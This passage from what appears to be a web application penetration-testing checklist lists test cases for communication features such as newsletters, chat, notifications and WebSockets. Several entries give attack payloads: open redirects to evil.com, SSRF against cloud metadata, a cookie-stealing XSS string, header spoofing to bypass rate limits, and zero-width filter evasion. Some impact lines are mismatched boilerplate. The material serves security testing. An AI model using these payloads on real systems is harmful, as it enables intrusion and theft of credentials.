
**Payload Example:**

```
message=Normal message\n[2025-01-01 00:00:00] ADMIN: System compromised\n[CRITICAL] Unauthorized access detected
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-180 — Newsletter Preference Center Open Redirect
**Test Category:** Open Redirect (WSTG-CLNT-04) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Access the newsletter preference center. 2. Check for redirect parameters in the URL. 3. Modify redirect URLs to external sites. 4. Verify redirect validation.

**Expected Result:** Application must validate all redirect URLs in the newsletter preference center against an allowlist.

**Payload Example:**

```
/newsletter/preferences?return_url=https://evil.com;/newsletter/manage?redirect=//evil.com/phishing
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite;Browser

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## COMM-181 — Announcement Visibility Escalation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. Create a draft or internal announcement. 2. Intercept and change visibility from draft to published or from internal to public. 3. Check if visibility controls are enforced.

**Expected Result:** Application must enforce announcement visibility controls server-side and require proper authorization for visibility changes.

**Payload Example:**

```
Change visibility=draft to visibility=published or scope=internal to scope=public in announcement update
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-182 — Email Notification Template Overwrite
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Check if email notification templates can be modified. 2. Attempt to overwrite system templates with malicious content. 3. Access template management endpoints with regular user credentials.

**Expected Result:** Application must restrict email template management to authorized admin roles and implement version control for templates.

**Payload Example:**

```
PUT /api/email-templates/password_reset with modified template content using regular user credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-183 — SMS Callback URL Manipulation
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. If SMS notifications have delivery callback URLs intercept and modify them. 2. Set callback to internal service. 3. Check for SSRF through SMS delivery callbacks.

**Expected Result:** Application must validate SMS callback URLs against an allowlist and prevent access to internal network resources.

**Payload Example:**

```
sms_callback_url=http://169.254.169.254/latest/meta-data/;delivery_webhook=http://localhost:6379/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COMM-184 — In-App Notification Real-Time XSS via WebSocket
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** In-App Notifications

**Test Steps:** 1. If in-app notifications arrive via WebSocket craft a notification containing XSS payload. 2. Send via WebSocket or trigger through user action. 3. Check if XSS executes when notification renders in real-time.

**Expected Result:** Application must sanitize WebSocket notification content before DOM insertion to prevent real-time XSS attacks.

**Payload Example:**

```
WebSocket message: {"type":"notification";"content":"<img src=x onerror=alert(document.cookie)>";"title":"<svg/onload=alert(1)>"}
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;wscat;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-185 — Notification Center Broken Object-Level Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Notification Center

**Test Steps:** 1. Access individual notification details. 2. Enumerate notification IDs. 3. Access notifications belonging to other users. 4. Check for authorization on each notification access.

**Expected Result:** Application must verify user authorization for every individual notification access request.

**Payload Example:**

```
GET /api/notifications/details/NOTIF-0001 through NOTIF-9999 with automated enumeration checking authorization
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Intruder;ffuf

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-186 — Digest Email Recipient Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Digest Emails (Daily/Weekly)

**Test Steps:** 1. Trigger digest email generation. 2. Intercept and modify the recipient email address. 3. Check if digest is sent to an unauthorized email. 4. Verify recipient validation.

**Expected Result:** Application must determine digest email recipients server-side from authenticated user data and not accept client-specified recipients.

**Payload Example:**

```
Change digest_recipient=user@test.com to digest_recipient=attacker@evil.com in digest trigger request
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-187 — Transactional Email Rate Limiting Bypass
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Transactional Emails

**Test Steps:** 1. Trigger transactional emails rapidly. 2. Test rate limiting on different types like password reset and order confirmation. 3. Attempt bypass using distributed requests.

**Expected Result:** Application must implement per-user and per-type rate limiting on all transactional email triggers.

**Payload Example:**

```
Send 100+ password reset emails in 1 minute;rotate IP via X-Forwarded-For to bypass rate limits
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## COMM-188 — Chat Message Type Confusion Attack
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Send chat messages with unexpected message types. 2. Change type from text to system or admin or notification. 3. Check if message type manipulation creates fake system messages.

**Expected Result:** Application must validate message types server-side and prevent users from sending messages with system or privileged types.

**Payload Example:**

```
Change message_type=text to message_type=system_alert or message_type=admin_notice in chat send request
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-189 — Video Call Metadata Leakage
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. Join a video call. 2. Inspect all API responses and WebSocket messages for metadata. 3. Check for leakage of participant IP addresses or device information or location data.

**Expected Result:** Video call system must minimize metadata exposure and not leak participant identifying information beyond what is necessary.

**Payload Example:**

```
Check signaling messages for participant_ip;device_model;os_version;location;network_info in call metadata
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;wscat;Wireshark

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-190 — Contact Form Response Time Information Leakage
**Test Category:** Information Disclosure (WSTG-INFO-01) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Submit contact forms with various email addresses. 2. Measure response times. 3. Check if response time differences indicate whether an email is associated with an account.

**Expected Result:** Application must ensure consistent response times for contact form submissions regardless of whether the provided email is a registered account.

**Payload Example:**

```
Compare response times for contact form with registered vs unregistered emails across 100+ submissions
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-191 — Newsletter Subscription API Abuse for Email Validation
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Use the newsletter subscription endpoint to validate email addresses. 2. Check if responses differ for valid vs invalid email formats. 3. Use for email harvesting.

**Expected Result:** Application must not provide detailed validation feedback that could be used for email harvesting or enumeration.

**Payload Example:**

```
POST /api/newsletter/subscribe with various emails and analyze response differences for email existence discovery
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-192 — Announcement Rich Media SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. If announcements support rich media with external URLs inject internal URLs. 2. Check if the server fetches media for preview or caching. 3. Monitor for SSRF.

**Expected Result:** Application must validate and whitelist all media URLs in announcements and prevent server-side fetching of internal resources.

**Payload Example:**

```
media_url=http://169.254.169.254/latest/meta-data/;image_url=http://localhost:8080/admin;video_url=http://internal:3306/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COMM-193 — WebSocket Reconnection Token Theft
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Check if WebSocket uses reconnection tokens. 2. Capture the reconnection token. 3. Use the token from a different session. 4. Verify if session hijacking is possible via reconnection tokens.

**Expected Result:** Application must bind WebSocket reconnection tokens to the original session and validate them against the current authentication state.

**Payload Example:**

```
Capture ws_reconnect_token from WebSocket messages;use from different browser/session to hijack connection
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## COMM-194 — Notification Preference Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Notification Preferences

**Test Steps:** 1. Send concurrent preference update requests with conflicting values. 2. Check if the final state is inconsistent. 3. Verify atomicity of preference updates.

**Expected Result:** Application must implement atomic preference updates to prevent race conditions resulting in inconsistent notification settings.

**Payload Example:**

```
Send concurrent PUT requests: one with email_enabled=true and another with email_enabled=false simultaneously
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## COMM-195 — Chat Typing Indicator Privacy Leak
**Test Category:** Privacy (WSTG-INFO-05) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Check if typing indicators are visible in conversations. 2. Verify if typing status can be monitored for users not in your contact list. 3. Test privacy controls on typing indicators.

**Expected Result:** Application must respect user privacy settings for typing indicators and not expose them to unauthorized observers.

**Payload Example:**

```
Subscribe to typing indicator WebSocket channel for non-contact users;GET /api/chat/typing-status?user_id=1002
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite;wscat

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## COMM-196 — Chat Message Content Scanning Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. If chat has content filtering or scanning send messages designed to bypass filters. 2. Use Unicode obfuscation or zero-width characters or encoding tricks. 3. Check filter effectiveness.

**Expected Result:** Application must implement robust content filtering that handles Unicode obfuscation and encoding bypass techniques.

**Payload Example:**

```
Send filtered_word with zero-width joiners: f​i​l​t​e​r​e​d;use homoglyphs;use invisible Unicode separators
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---
